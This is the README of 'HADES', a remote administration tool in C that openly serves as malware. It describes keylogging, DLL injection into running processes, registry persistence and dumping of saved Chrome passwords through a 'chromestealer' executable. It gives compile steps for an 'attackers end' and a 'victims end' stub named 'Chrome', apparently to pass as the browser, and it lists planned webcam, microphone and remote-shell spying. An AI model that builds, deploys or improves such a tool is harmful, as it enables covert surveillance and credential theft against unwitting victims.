---- THIS HAS ONLY BEEN TESTED ON A WINDOWS 7 COMPUTER. MAKE SURE YOU TEST BEFORE USING ----


HADES is a Work In Progress Remote Administration Tool written in the C Programming Language. 
Version 1.00 has the basic features in, however the code in incomplete and things such as 
error handling has not been implemented fully, therefore you should not rely 100% on this version.

HADES 1.00 offers the ability to upload files, download files, log keystrokes for a certain period 
of time, retrieve basic system information such as the Public IP Address, inject a DLL into a
running process, retrieve a list of running processes, view system time, add itself to the registry
in order to create persistence, remove itself from the registry and dump all saved Chrome passwords
using a Python Executable called "chromestealer".

Please bear in mind that the code is INCOMPLETE and there is quite a bit missing from it. Hopefully 
the next version will have much cleaner code, along with comments so you can fully understand each
of the functions. Error handling will also be fully implemented in the next version. The code also 
may not be amazing, as I am a beginner/intermediate when it comes to coding in C.

Features to come in future updates (if possible):

	[*] Asynchronous Keylogger
	[*] ERROR HANDLING
	[*] Firefox, IE Password dumps
	[*] Webcam viewer
	[*] Remote Microphone
	[*] Remote Desktop
	[*] Remote Shell
	[*] Proper Uploading + Downloading Functions
	[*] Geo Location Capabilities
	[*] Built In Password Dumping (No Python Dependencies)
	[*] Linux GUI
	[*] Cross Platform

Setting Up:

In order to set up the attackers end, you will require the Linux OS along with GCC. In a terminal,
type "gcc LinClient.c -o Hades" and it will compile for you. Then type "./Hades" and hit enter.

To set up the victims end, you will require a Windows Computer with GCC installed, so that you can
compile the stub. In the command prompt, type in "gcc WinServer.c -o Chrome -lws2_32 -lwsock32",
where WinServer.c is the name of the C file and Chrome is the name of the EXE that will be compiled.

To compile the chromestealer.py file, you will require a Windows Computer with PyInstaller and Python
2.7 installed. In a command prompt, type in "pyinstaller chromestealer.py --onefile". Please bear in
mind that you must call the EXE file chromestealer.exe, otherwise you will have to edit the WinServer
source code.
